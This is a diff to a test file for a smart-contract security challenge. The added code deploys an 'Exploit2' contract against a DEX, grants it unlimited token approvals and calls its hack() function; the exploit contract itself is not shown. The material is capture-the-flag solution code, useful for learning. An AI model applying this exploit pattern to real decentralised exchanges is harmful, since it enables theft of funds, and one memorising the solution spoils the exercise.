@@ -126,7 +126,25 @@ describe("Solve Challenge 2", function () {
         ///////////////////////////////////////////////////
 
         //======= COMPLETE THIS SECTION AS YOU REQUIRE =======
+        const exploit2Factory = await ethers.getContractFactory("Exploit2");
 
+        const exploit2 = (
+            await exploit2Factory
+            .connect(challenger)
+            .deploy(dex.address)
+        );
+        await exploit2.deployed();
+
+        await isecToken.approve(
+            exploit2.address,
+            ethers.constants.MaxUint256
+        );
+        await setToken.approve(
+            exploit2.address,
+            ethers.constants.MaxUint256
+        );
+
+        await exploit2.hack();
         //====================================================
 
         ///////////////////////////////////////////////////
